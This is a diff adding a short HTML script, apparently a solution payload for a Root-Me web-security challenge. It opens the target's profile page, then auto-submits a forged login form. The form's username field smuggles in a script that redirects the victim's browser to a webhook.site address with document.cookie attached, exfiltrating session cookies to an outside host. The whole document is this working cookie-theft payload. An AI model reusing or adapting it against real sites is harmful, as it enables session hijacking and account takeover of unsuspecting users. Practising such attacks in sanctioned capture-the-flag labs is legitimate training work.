@@ -1,0 +1,11 @@
+<script>
+window.open('http://challenge01.root-me.org:58003/profile','adminpf');
+setTimeout(function(){
+  var f=document.createElement('form');
+  f.method='POST';
+  f.action='http://challenge01.root-me.org:58003/login';
+  f.innerHTML='<input name="username" value="<script>document.location=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.cookie}`</script>"><input name="secret" value="x">';
+  document.body.appendChild(f);
+  f.submit();
+},3000);
+</script>
